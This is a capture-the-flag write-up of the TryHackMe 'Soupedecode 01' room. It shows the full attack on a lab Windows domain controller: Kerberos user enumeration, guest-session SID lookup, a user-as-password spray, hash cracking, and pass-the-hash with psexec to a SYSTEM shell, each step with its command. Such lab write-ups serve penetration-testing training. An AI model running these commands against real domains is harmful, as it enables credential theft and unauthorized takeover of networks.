<img width="93" height="79" alt="Capture d'écran 2025-08-15 104705" src="https://github.com/user-attachments/assets/345c85f4-6f4e-4000-be8c-4c0036518b02" />

This machine, named **Soupedecode**, is an intense and highly engaging **Windows** challenge. It revolves around compromising a **domain controller** by leveraging multiple Active Directory attack vectors. Throughout the engagement, we will enumerate SMB shares, perform password spraying against Kerberos authentication, and utilize **Pass-the-Hash** techniques to escalate privileges. This challenge offers a realistic look into the attack chain commonly seen in enterprise environments. Let’s walk through each stage of the compromise and uncover the path to owning the domain!

Challenge : [Soupedecode 01](https://tryhackme.com/room/soupedecode01)

---

### Initial enumeration

#### Nmap

We begin with a full port scan in order to see what services are exposed : 

```
nmap 10.10.92.122 -sV -sC -Pn -p- -oN nmapres
```

**Results :**

<img width="942" height="740" alt="Capture d'écran 2025-08-15 110052" src="https://github.com/user-attachments/assets/016c18a7-35ae-4432-9fed-dcfad61a88d6" />

The scan reveals a Windows Domain Controller hosting several key services:

- **53/tcp (DNS)** – Indicates the machine likely resolves domain-related queries internally.

- **88/tcp (Kerberos)** – Confirms the presence of Active Directory authentication.

- **389/tcp & 636/tcp (LDAP/LDAPS)** – Used for directory queries; may expose domain structure.

- **3389/tcp (RDP)** – Remote desktop is open, potentially usable later for direct access.

From the service banners, we identify the **hostname** as `DC01` and the **Active Directory domain** as `SOUPEDECODE.LOCAL`.  
SMB signing is enabled and required, which will limit certain SMB-based relay attacks but still allow enumeration and authentication attempts.

#### enum4linux-ng
	
Then we can run `enum4linux-ng` against the target to gather domain-related information. The scan returned several important findings that will guide our next steps. 

```
enum4linux-ng -A 10.10.92.122 -oA results.txt
```

**Domain Name and FQDN :** 

```
[...]
Domain: SOUPEDECODE.LOCAL
NetBIOS Domain Name: SOUPEDECODE
FQDN: DC01.SOUPEDECODE.LOCAL
[...]
```

This confirms we are dealing with an Active Directory environment and identifies the domain controller’s fully qualified domain name (FQDN). These values will be essential for Kerberos-based attacks and for correctly setting up our `/etc/hosts` file.

**Hostname :**

```
[...]
NetBIOS Computer Name: DC01
[...]
```

The machine name **DC01** strongly suggests this is the primary **Domain Controller**,the heart of the AD environment and our ultimate target.

**Open Ports and Services :**

The scan confirmed key services running on the DC:

- **LDAP**: 389 (LDAP) and 636 (LDAPS)
- **SMB**: 445 and 139
- **Kerberos**: 88

These services are exactly what we expect in an AD network and will be our main attack vectors.

**SMB Protocol Support :**

```
[...]
SMB 1.0: false
SMB 2.02 / SMB 2.1 / SMB 3.0 / SMB 3.1.1: true
SMB signing required: true
[...]
```

SMBv1 is disabled (good from a defensive standpoint). However, SMB signing is enabled and required, meaning SMB relay attacks won’t be possible, but password spraying and Kerberos authentication attacks are still viable.

**SMB Session Access :**

```
[...]
Null session: not allowed
Random user session: allowed
[...]
```

Null sessions are blocked, but the server accepts connections with a valid username even if the password is empty. This means that once we discover valid usernames, we may be able to enumerate more information without needing their password.

**Operating System :**

```
[...]
OS: Windows Server 2016/2019/2022
Build: 10.0.20348
[...]
```

The build number corresponds to **Windows Server 2022**, a modern and hardened OS. This may limit some legacy attacks but won’t protect against credential-based exploitation.

**Summary :**

From this initial enumeration, we have confirmed:

- The target is a **Windows Server 2022 Domain Controller** named **DC01**.

- The domain is **SOUPEDECODE.LOCAL**.

- Kerberos, LDAP, and SMB are open and ready for enumeration.

- SMB signing is enforced, preventing relay attacks but allowing other authentication-based approaches.

- Finding valid usernames will be our next priority, as they could open the door to deeper enumeration.

Our next logical step will be **user enumeration**, for example, using tools like `kerbrute` to identify valid accounts for password spraying or Kerberos ticket attacks.

#### Kerbrute

Using a wordlist and the domain controller, we can enumerate valid usernames via Kerberos :

```sh
kerbrute userenum --dc DC01.SOUPEDECODE.LOCAL -d SOUPEDECODE.LOCAL /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt
```

<img width="968" height="444" alt="Capture d'écran 2025-08-15 120314" src="https://github.com/user-attachments/assets/b2760865-61b0-4141-aab8-22b3fe351e25" />

These usernames can now be leveraged to query the Active Directory, perform RID attacks, or for Kerberos password guessing in order to enumerate additional valid accounts.

#### SMB Null Session enumeration

After identifying valid usernames via `Kerbrute`, we tested which accounts could authenticate over SMB without a password using `nxc smb` :

```
nxc smb DC01.SOUPEDECODE.LOCAL -u <username> -p ''
```

<img width="973" height="448" alt="Capture d'écran 2025-08-15 121423" src="https://github.com/user-attachments/assets/f535d823-b267-41b2-b989-1f83db273baf" />

**Results :**

- `admin` and `charlie` returned `STATUS_LOGON_FAILURE`, meaning a null login was not allowed.

- `guest` successfully authenticated with a blank password, indicating a **null session** was permitted.

This allowed us to access SMB shares and enumerate available resources on the server **without needing credentials**, providing a foothold for further enumeration, such as listing shares and potentially performing RID cycling to discover additional user accounts.

#### smb_lookupsid

We used the Metasploit auxiliary module `scanner/smb/smb_lookupsid` to enumerate users on the target SMB server. The module allows resolving SIDs to account names, leveraging a feature of SMB that does not require full authentication :

**Steps taken :**

```msfconsole
msf6 > search lookupsid

Matching Modules
================

   #  Name                                                   Disclosure Date  Rank    Check  Description
   -  ----                                                   ---------------  ----    -----  -----------
   0  auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli  .                normal  No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
   1  auxiliary/admin/mssql/mssql_enum_domain_accounts       .                normal  No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
   2  auxiliary/scanner/smb/smb_lookupsid                    .                normal  No     SMB SID User Enumeration (LookupSid)
   3    \_ action: DOMAIN                                    .                .       .      Enumerate domain accounts
   4    \_ action: LOCAL                                     .                .       .      Enumerate local accounts


Interact with a module by name or index. For example info 4, use 4 or use auxiliary/scanner/smb/smb_lookupsid
After interacting with a module you can manually set a ACTION with set ACTION 'LOCAL'

msf6 > use 2
[*] Using action LOCAL - view all 2 actions with the show actions command
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf6 auxiliary(scanner/smb/smb_lookupsid) >
msf6 auxiliary(scanner/smb/smb_lookupsid) > set RHOST 10.10.213.214
RHOST => 10.10.213.214
msf6 auxiliary(scanner/smb/smb_lookupsid) > set SMBUser Guest
SMBUser => Guest
msf6 auxiliary(scanner/smb/smb_lookupsid) > set MinRID 1000
MinRID => 1000
msf6 auxiliary(scanner/smb/smb_lookupsid) > set MaxRID 2000
MaxRID => 2000
msf6 auxiliary(scanner/smb/smb_lookupsid) > run
```

**Results :**

```
    Type   Name            RID
    ----   ----            ---
    User   DC01$           1000
    Alias  DnsAdmins       1101
    Group  DnsUpdateProxy  1102
    User   bmark0          1103
    User   otara1          1104
    User   kleo2           1105
    User   eyara3          1106
    User   pquinn4         1107
    User   jharper5        1108
    User   bxenia6         1109
    User   gmona7          1110
    User   oaaron8         1111
    User   pleo9           1112
    User   evictor10       1113
    [...]
    User   qjack289        1389
    [...]
    User   stina909        1981
    User   ereed910        1982
    User   qvictor911      1983
    User   apaul912        1984
    User   ccharlie913     1985
    User   gnoah914        1986
    User   uyvonne915      1987
    User   dfiona916       1988
    User   xtom918         1989
    User   agloria919      1990
    User   urose920        1991
    User   lzach922        1992
    User   xkylie923       1993
    User   mquinton924     1994
    User   lfiona925       1995
    User   yfrank928       1996
    User   vkevin929       1997
    User   iyusuf930       1998
    User   ifrank931       1999
    User   pyara932        2000

[*] 10.10.213.214: - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_lookupsid) >
```

Then we can create a `users.txt` file where we can found those usernames : 

<img width="929" height="697" alt="Capture d'écran 2025-08-15 131455" src="https://github.com/user-attachments/assets/3cd1252f-cb87-4b20-862f-6b985aa3e8c8" />

Now we can extract the usernames with the following command : 

```sh
grep "User" users.txt | cut -d " " -f8 | cut -d " " -f1  > users2.txt
```

<img width="733" height="266" alt="Capture d'écran 2025-08-15 131750" src="https://github.com/user-attachments/assets/59d62822-a4c0-424c-b277-9ae72ee2bc56" />

#### Password spraying attack

Once we have our list of usernames in `users2.txt`, we can attempt to find a valid username/password combination by leveraging **poor password practices**, such as users setting their password identical to their username.

We used **Kerbrute** to perform a password spray attack where each username is tried as its own password using the `--user-as-pass` option :

```sh
kerbrute passwordspray --user-as-pass -d SOUPEDECODE.LOCAL --dc DC01.SOUPEDECODE.LOCAL users2.txt -v
```

This scan revealed one valid login :

<img width="932" height="964" alt="Capture d'écran 2025-08-15 132457" src="https://github.com/user-attachments/assets/46d4334a-d94f-472b-9226-1412d92bf979" />

All other accounts returned `Invalid password`. This confirms that **the user `<REDACTED>` used their username as their password**, allowing us to authenticate without any additional credentials.

With this valid login, we can now access services on the domain to enumerate shares, explore accessible resources, and potentially escalate privileges.

---
### User flag

Using the retrieved credentials, we first checked what SMB shares the user had access to. Running **smbmap** allowed us to enumerate shares and confirm our permissions :

```sh
smbmap -u <username> -p <password> -H 10.10.213.214
```

The output shows that the user has **read-only access** to the `Users` share, while sensitive administrative shares like `ADMIN$` and `C$` are not accessible :

<img width="919" height="264" alt="Capture d'écran 2025-08-15 135829" src="https://github.com/user-attachments/assets/e8dac506-46c3-4846-925d-ec1a6274a23f" />

Next, we used **smbclient** to explore the `Users` share :

```sh
smbclient //10.10.213.214/Users -U <username>
```

Navigating to the user’s Desktop directory revealed the `user.txt` file containing the **user flag** :

<img width="936" height="501" alt="Capture d'écran 2025-08-15 140041" src="https://github.com/user-attachments/assets/78dd444b-a8cc-49c4-9a1e-d3e41c892f22" />

---
### Root flag

After compromising the initial user account, I switched to another machine *(TryHackMe AttackBox Machine)* due to issues with `impacket`, which was not functioning properly on my environment. Once on the new machine, I dumped the hashes from the system. With these hashes in hand, I proceeded to attempt offline cracking using `John the Ripper` to recover password : 

<img width="1918" height="765" alt="Capture d'écran 2025-08-15 151757" src="https://github.com/user-attachments/assets/6b331994-68e7-4e45-99a8-c59b27eed333" />

```sh
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Results :**

This provided the plaintext credentials for the `file_svc` account, allowing further privilege escalation steps : 

<img width="874" height="236" alt="Capture d'écran 2025-08-15 154601" src="https://github.com/user-attachments/assets/322498b7-4ef5-4b1d-9d20-1db4e9e8ee71" />

With the recovered credentials for `file_svc`, I attempted SMB enumeration to identify accessible network shares with the following command : 

```sh
smbmap -u "file_svc" -p <REDACTED> -H 10.10.213.214
```

<img width="945" height="188" alt="Capture d'écran 2025-08-15 155153" src="https://github.com/user-attachments/assets/43cde7ef-2e59-4014-8895-b7a55ff24a52" />

The scan revealed multiple shares, with `backup` being accessible in **READ ONLY** mode.

I connected to the share using `smbclient`:

``` sh
smbclient //10.10.213.214/backup -U file_svc
```

Listing the contents showed a file named `backup_extract.txt`. I downloaded it locally :

<img width="970" height="246" alt="Capture d'écran 2025-08-15 155510" src="https://github.com/user-attachments/assets/ad730f18-a3b0-4b74-8d6d-eb0653d82c15" />

Inspecting the file revealed what appeared to be **NTLM hashes** for several machine accounts :

<img width="860" height="203" alt="Capture d'écran 2025-08-15 155702" src="https://github.com/user-attachments/assets/94480352-dedf-4be7-ba7a-d2b809aeaf1f" />

Our goal was to separate the machine account names from their hashes for testing. First, we extracted the server names :

``` sh
cat backup_extract.txt| cut -d ":" -f1 > servers.txt
```

<img width="689" height="252" alt="Capture d'écran 2025-08-15 160539" src="https://github.com/user-attachments/assets/cca4d53e-6507-41a8-89dc-76f36bd2f059" />

Then, we extracted the corresponding NTLM hashes:

```sh
 cat backup_extract.txt| cut -d ":" -f4 > hashes2.txt
```

<img width="551" height="260" alt="Capture d'écran 2025-08-15 160418" src="https://github.com/user-attachments/assets/afa6874f-4040-472e-8432-c6c797ff6d0f" />

With the lists prepared, we used **NetExec** to test each machine account against the domain controller :

```sh
nxc smb SOUPEDECODE.LOCAL -u servers.txt -H hashes2.txt --no-bruteforce
```

In our case, the account **FileServer$** was flagged as `(Pwn3d!)`, indicating it had admin-level access :

<img width="985" height="247" alt="Capture d'écran 2025-08-15 161625" src="https://github.com/user-attachments/assets/51717d6a-d3cb-4cdd-8fcf-6098d24ab65f" />

With the compromised machine account identified (**FileServer$**), we leveraged **Impacket’s `psexec.py`** through our prepared environment to execute commands remotely on the target Windows machine. This allowed us to upload a malicious executable and spawn a system-level shell :

```
/root/.local/share/uv/tools/netexec/bin/psexec.py 'FileServer$@10.10.213.214' -hashes ':<REDACTED>'
```

<img width="1897" height="283" alt="Capture d'écran 2025-08-15 165835" src="https://github.com/user-attachments/assets/f9e55119-2ba7-48a7-970b-fc7ecbe2b7e7" />

Once the service was running, we had an interactive shell as `SYSTEM` :

<img width="331" height="54" alt="Capture d'écran 2025-08-15 170014" src="https://github.com/user-attachments/assets/e34c011c-7b8b-41a7-b7ec-2f5ffec81d41" />

From here, retrieving the root flag was straightforward. Using the correct absolute path in Windows syntax, we ran :

``` powershell
type C:\Users\Administrator\Desktop\root.txt
```

<img width="693" height="152" alt="Capture d'écran 2025-08-15 170131" src="https://github.com/user-attachments/assets/c9d8bcec-3c40-4931-9ea2-4262b670b1dd" />

This confirmed full administrative compromise of the target machine.

---

**Congratulations!** I hope you found this write-up insightful. This CTF was an engaging challenge that emphasized the importance of enumerating network services, analyzing machine account permissions, and leveraging Windows misconfigurations for privilege escalation. From identifying the writable share and exploiting the **FileServer$** machine account to gaining SYSTEM access and retrieving the root flag, this challenge demonstrated how methodical enumeration and persistence are essential in penetration testing.

Thanks for reading, and happy hacking!

<img width="845" height="329" alt="Capture d'écran 2025-08-15 170502" src="https://github.com/user-attachments/assets/ab0d9967-4387-4cc9-bbdc-c833535a86dc" />
